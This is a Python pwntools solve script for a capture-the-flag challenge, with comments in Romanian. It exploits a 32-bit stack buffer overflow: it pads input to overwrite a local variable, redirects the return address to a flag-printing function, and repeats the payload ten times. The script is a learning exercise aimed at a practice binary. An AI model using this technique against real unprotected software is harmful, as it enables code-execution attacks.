#!/usr/bin/env python3
# ============================================================================
# CTF: model_activ — stack BOF (suprascriere variabila locala + ret2win)
# Vulnerabilitate: overflow care (1) seteaza variabila 'lucky' la 0 ca sa treci de
#   check-ul de "win" si (2) suprascrie return address cu desire() (printeaza flag).
#   atoi(buf)=0; pad la lucky; lucky=0; gap+ebx+ebp; ret->desire. Repetat de 10 ori
#   (contorul porneste de la 10 si trebuie sa ajunga win la 10).
# Binar: ELF 32-bit (i386), not stripped | NX on · fara canary · No-PIE · Partial RELRO
#   - Fara canary => poti suprascrie si variabila locala si ret-ul. No-PIE => desire fix.
# ============================================================================
import sys
import re
from pwn import *

context.binary = elf = ELF('./model_activ')
context.log_level = 'error'          # scoate zgomotul pwntools

def connect():
    # remote doar daca ai dat HOST + PORT numeric; altfel proces local
    if len(sys.argv) >= 3 and sys.argv[2].isdigit():
        return remote(sys.argv[1], sys.argv[2])
    return process('./model_activ')

p = connect()

payload  = b'0'                          # atoi(buf) -> 0
payload += b'A' * (36 - 1)               # pad to lucky
payload += p32(0)                        # lucky = 0  -> win
payload += b'C' * (52 - 40)              # gap + saved ebx + saved ebp
payload += p32(elf.symbols['desire'])    # return into desire() -> prints flag
assert b'\n' not in payload

for _ in range(10):                      # counter starts at 10, win must reach 10
    p.recvuntil(b"Enter your lucky number:")
    p.sendline(payload)

out = p.recvall(timeout=2)
# cauta un flag care incepe cu CTF, SI sau FLAG; daca nu-l gaseste, arata output-ul brut
flag = re.search(rb"(CTF|SI|FLAG)\{[^}]*\}", out)
print(flag.group().decode() if flag else out)